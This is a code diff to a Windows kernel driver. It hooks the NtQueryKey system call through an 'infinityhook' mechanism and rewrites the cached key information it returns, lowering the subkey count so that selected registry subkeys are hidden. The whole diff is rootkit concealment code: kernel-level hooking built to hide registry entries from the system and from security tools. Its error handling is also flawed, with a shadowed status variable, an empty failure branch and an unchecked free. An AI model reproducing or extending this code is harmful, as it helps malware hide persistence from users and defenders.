@@ -37,7 +37,34 @@ NTSTATUS DetourNtQueryKey(
 	_Out_ PULONG ResultLength)
 {
 	PrintRegistryKeyHandleInformation(KeyHandle, L"NtQueryKey");
-	return OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
+	if (KeyInformationClass == 4) {
+			NTSTATUS status = OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
+			if (NT_SUCCESS(status)) {
+				PKEY_CACHED_INFORMATION KeyCachedInformationPtr = (PKEY_CACHED_INFORMATION)KeyInformation;
+				kprintf("[+] infinityhook: NtQueryKey: SubKeys: %ul, MaxNameLen: %ul, Values: %ul, NameLength: %ul\n", KeyCachedInformationPtr->SubKeys, KeyCachedInformationPtr->MaxNameLen, KeyCachedInformationPtr->Values, KeyCachedInformationPtr->NameLength);
+
+				// now check if there are any subkeys that should be hidden
+				ULONG HideSubkeyIndexesCount = 0, OkSubkeyIndexesCount = 0;
+				PULONG OkSubkeyIndexesPtr = NULL;
+				NTSTATUS status = RegistryKeyHideInformation(KeyHandle, &HideSubkeyIndexesCount, &OkSubkeyIndexesCount, &OkSubkeyIndexesPtr);
+
+				if (!NT_SUCCESS(status)) {
+					// TODO - do something if this fails?
+				}
+
+				kprintf("[+] infinityhook: NtQueryKey After Zw: Indexes count: %d, hide indexes count: %d\n", OkSubkeyIndexesCount, HideSubkeyIndexesCount);
+				
+				// !!! DO NOT FORGET TO FREE OkSubkeyIndexesPtr
+				ExFreePool(OkSubkeyIndexesPtr);
+
+				// if there are any subkeys that should be hidden, decrease the SubKeys member of the struct
+				if (HideSubkeyIndexesCount > 0) {
+					KeyCachedInformationPtr->SubKeys -= HideSubkeyIndexesCount;
+				}
+			}
+		return status;
+	}
+	else return OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
 	//if (KeyInformationClass == 3) {
 	//	NTSTATUS status = OriginalNtQueryKey(KeyHandle, KeyInformationClass, KeyInformation, Length, ResultLength);
 	//	if (NT_SUCCESS(status)) {
